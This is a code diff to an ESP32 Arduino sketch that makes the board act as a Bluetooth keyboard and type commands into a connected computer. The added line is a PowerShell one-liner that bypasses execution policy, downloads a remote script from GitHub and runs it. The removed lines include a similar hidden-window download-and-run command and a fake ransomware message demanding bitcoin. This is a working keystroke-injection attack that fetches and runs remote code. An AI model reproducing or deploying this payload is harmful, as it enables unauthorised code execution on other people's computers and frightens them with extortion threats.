@@ -1,6 +1,7 @@
 /**
  * This example turns the ESP32 into a Bluetooth LE keyboard that writes the words, presses Enter, presses a media key and then Ctrl+Alt+Delete
  */
+
 #include <BleKeyboard.h>
 
 BleKeyboard bleKeyboard;
@@ -11,10 +12,7 @@ void setup() {
   bleKeyboard.begin();
 }
 
-// char payload [] = "powershell Add-Type -AssemblyName System.speech; $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; $speak.Speak(\"You Have Been Hack,a crypto locker will execute, send bitcoin to my address now\"); Start-Process \"https://www.youtube.com/embed/xvFZjo5PgG0?autoplay=1\"";
-// Bad Power shell char payload [] = "powershell -W Hidden -Exec Bypass $a= Invoke-WebRequest https://chocolatey.org/install.ps1 -UseBasicParsing; Invoke-Expression $a";
-
-char payload [] = "powershell -Exec Bypass $a= Invoke-WebRequest https://raw.githubusercontent.com/jkljkl1197/ArduinoFun/main/FunPayload.ps1 -UseBasicParsing; Invoke-Expression $a";
+const char payload [] = "powershell -W Minimized -Exec Bypass $a= Invoke-WebRequest https://raw.githubusercontent.com/jkljkl1197/ArduinoFun/main/FunPayload.ps1 -UseBasicParsing; Invoke-Expression $a";
 
 void loop() {
   if(bleKeyboard.isConnected()) {
@@ -27,6 +25,7 @@ void loop() {
     delay(100);
     bleKeyboard.releaseAll();
     delay(1000);
+    bleKeyboard.press(KEY_MEDIA_VOLUME_UP);
     
     Serial.println("Sending payload");
     int len = strlen(payload);
@@ -34,11 +33,12 @@ void loop() {
       bleKeyboard.print((char) payload[i]);
       delay(5);
     }
-    
+
     Serial.println("Sending Return");
     bleKeyboard.press(KEY_RETURN);
     delay(100);
     bleKeyboard.releaseAll();
+    
     Serial.println("Finish");
     delay(50000);
   } else {
